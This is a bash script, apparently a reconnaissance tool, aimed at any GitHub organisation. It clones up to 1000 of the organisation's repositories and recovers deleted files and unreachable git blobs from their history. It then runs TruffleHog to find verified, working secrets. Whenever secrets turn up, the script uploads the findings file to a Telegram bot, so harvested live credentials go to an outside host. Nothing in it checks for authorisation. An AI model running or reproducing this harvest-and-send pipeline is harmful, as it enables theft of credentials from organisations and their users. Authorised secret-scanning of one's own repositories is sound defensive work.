#!/bin/bash

# Configuration
ORG_NAME="<organization name>" #eg: "Apache"
MAX_REPOS=1000 #max number of repositories to clone within an org. (could be changed to any preferable number)
OUTPUT_DIR="scan_results"
LOG_FILE="scan_${ORG_NAME}_$(date +%Y%m%d_%H%M%S).log"
TELEGRAM_CHAT_ID="<TG-Chat_id>" #Telegram chat ID
TELEGRAM_BOT_TOKEN="<Token>" #Telegram bit Token

send_telegram() {
    local MESSAGE="$1"
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
        -d chat_id="$TELEGRAM_CHAT_ID" \
        -d text="$MESSAGE" >/dev/null
}

# Log everything to both terminal and file
exec > >(tee -a "$LOG_FILE") 2>&1

mkdir -p "$OUTPUT_DIR"

echo "Starting repository processing for organization: $ORG_NAME"
echo "Log file: $LOG_FILE"
echo "------------------------------------------------------------"

# Get list of repository names from GitHub
gh repo list "$ORG_NAME" -L "$MAX_REPOS" --json name --jq '.[].name' | while read -r REPO_NAME; do
    echo
    echo "=== Processing repository: $REPO_NAME ==="

    echo "[1/6] Cloning repository..."
    if ! git clone --no-checkout "https://github.com/$ORG_NAME/$REPO_NAME.git" "$REPO_NAME"; then
        echo "ERROR: Failed to clone $REPO_NAME" | tee -a "clone_errors.log"
        continue
    fi

    cd "$REPO_NAME" || { echo "ERROR: Failed to enter $REPO_NAME"; rm -rf "$REPO_NAME"; continue; }

    echo "[2/6] Restoring deleted files..."
    mkdir -p "__ANALYSIS/del"
    git rev-list --all | while read -r commit; do
        parent_commit=$(git log --pretty=format:"%P" -n 1 "$commit" | awk '{print $1}')
        [ -z "$parent_commit" ] && continue
        git -c diff.renameLimit=12308 diff --name-status "$parent_commit" "$commit" | grep -q '^D' && \
        git -c diff.renameLimit=12308 diff --name-status "$parent_commit" "$commit" | grep '^D' | while read -r _ file; do
            safe_file_name=$(echo "$file" | sed 's/\//_/g')
            git show "$parent_commit:$file" > "__ANALYSIS/del/${safe_file_name}" 2>/dev/null
        done
    done

    echo "[3/6] Processing .pack files..."
    PACK_DIR=".git/objects/pack"
    if [ -d "$PACK_DIR" ]; then
        for pack_file in "$PACK_DIR"/*.pack; do
            [ -e "$pack_file" ] || continue
            base_pack_file=$(basename "$pack_file")
            mv "$pack_file" "./$base_pack_file"
            git verify-pack -v "$base_pack_file" >/dev/null 2>&1
            cat "$base_pack_file" | git unpack-objects >/dev/null 2>&1
            rm -f "$base_pack_file"
        done
    fi

    echo "[4/6] Extracting unreachable blobs..."
    mkdir -p "unreachable_blobs"
    git fsck --unreachable --dangling --no-reflogs --full - | \
        grep 'unreachable blob' | awk '{print $3}' | while read -r h; do
        git cat-file -p "$h" > "unreachable_blobs/$h.blob" 2>/dev/null
    done

    cd ..

    echo "[5/6] Running TruffleHog scan..."
    SCAN_FILE="$OUTPUT_DIR/${ORG_NAME}.${REPO_NAME}.secrets.txt"
    trufflehog filesystem --only-verified --print-avg-detector-time --include-detectors="all" "$REPO_NAME" > "$SCAN_FILE"

    if [[ -s "$SCAN_FILE" ]]; then
        echo "Secrets found! Sending to Telegram..."
        curl -s -F chat_id="$TELEGRAM_CHAT_ID" \
             -F document=@"$SCAN_FILE" \
             -F caption="🐷🐷🔑New secrets found🔑🐷🐷- $ORG_NAME - $REPO_NAME" \
             "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument" >/dev/null
    else
        echo "No secrets found in $REPO_NAME."
        rm -f "$SCAN_FILE"
    fi

    echo "[6/6] Deleting repository..."
    rm -rf "$REPO_NAME"

    echo "=== Finished: $REPO_NAME ==="
done

send_telegram "✅ Scan completed for organization: $ORG_NAME at $(date)"
echo "All repositories processed."

